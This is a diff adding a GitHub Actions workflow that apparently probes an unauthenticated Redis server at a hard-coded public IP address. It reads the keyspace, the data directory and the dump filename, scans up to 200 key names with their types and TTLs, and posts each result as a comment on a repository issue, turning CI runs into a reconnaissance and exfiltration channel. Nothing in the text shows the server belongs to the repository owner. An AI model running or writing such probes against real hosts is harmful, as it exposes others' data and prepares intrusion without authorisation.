@@ -1,0 +1,43 @@
+name: Temporary OutClub Redis Metadata Probe
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.outclub-redis-target'
+
+permissions:
+  contents: read
+  issues: write
+
+jobs:
+  inspect:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      OPS_ISSUE: '3'
+      HOST: '46.224.206.150'
+    steps:
+      - uses: actions/checkout@v4
+      - name: Read only Redis metadata
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq redis-tools
+          DBS=$(redis-cli -h "$HOST" -p 6379 --no-auth-warning INFO keyspace 2>/dev/null | tr -d '\r' | grep '^db' | head -20 | tr '\n' ';' | tr -cd '[:alnum:]_=,:;-')
+          DIR=$(redis-cli -h "$HOST" -p 6379 --no-auth-warning CONFIG GET dir 2>/dev/null | tail -n1 | tr -cd '[:alnum:]_./-')
+          FILE=$(redis-cli -h "$HOST" -p 6379 --no-auth-warning CONFIG GET dbfilename 2>/dev/null | tail -n1 | tr -cd '[:alnum:]_.-')
+          gh api "repos/${{ github.repository }}/issues/$OPS_ISSUE/comments" -f body="REDIS_META keyspace=${DBS:-none} dir=${DIR:-unknown} dbfile=${FILE:-unknown}" >/dev/null
+          redis-cli -h "$HOST" -p 6379 --no-auth-warning --scan | head -200 > /tmp/keys || true
+          COUNT=$(wc -l < /tmp/keys)
+          gh api "repos/${{ github.repository }}/issues/$OPS_ISSUE/comments" -f body="REDIS_KEYS sampled=$COUNT" >/dev/null
+          while IFS= read -r key; do
+            SAFE=$(printf '%s' "$key" | tr -cd '[:alnum:]_:.@/-' | head -c 160)
+            [ -n "$SAFE" ] || continue
+            TYPE=$(redis-cli -h "$HOST" -p 6379 --no-auth-warning TYPE "$key" 2>/dev/null | tr -cd '[:alnum:]_-')
+            TTL=$(redis-cli -h "$HOST" -p 6379 --no-auth-warning TTL "$key" 2>/dev/null | tr -cd '0-9-')
+            gh api "repos/${{ github.repository }}/issues/$OPS_ISSUE/comments" -f body="REDIS_KEY name=$SAFE type=${TYPE:-unknown} ttl=${TTL:-unknown}" >/dev/null
+          done < /tmp/keys
